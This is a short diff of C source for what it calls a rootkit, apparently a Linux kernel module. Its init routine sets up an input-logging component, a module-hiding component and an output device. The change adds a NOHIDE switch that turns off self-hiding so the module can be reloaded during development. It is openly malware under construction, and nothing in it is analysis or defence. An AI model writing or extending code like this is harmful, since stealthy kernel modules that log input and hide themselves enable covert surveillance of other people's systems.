@@ -9,6 +9,8 @@
 #include "moduleHide.h"
 #include "outputDevice.h"
 
+#define NOHIDE		// Needed if you intend to be able to unload/reload the module without rebooting
+
 static int __init main_init(void) {
 	int error;
 	printk(KERN_INFO "Installing rootkit. Compiled: %s %s\n", __TIME__, __DATE__); // TODO: print time etc..
@@ -19,9 +21,11 @@ static int __init main_init(void) {
 
 	error = logInput_init();
 	if (error) return error;
-	
+
+#ifndef NOHIDE
 	error = moduleHide_init();
 	if (error) return error;
+#endif
 
 	printk(KERN_INFO "Rootkit installed\n");
 	return 0;
@@ -29,7 +33,9 @@ static int __init main_init(void) {
 
 static void __exit main_exit(void) {
 	
+#ifndef NOHIDE
 	moduleHide_exit();
+#endif
 	logInput_exit();
 	outputDevice_exit();
 
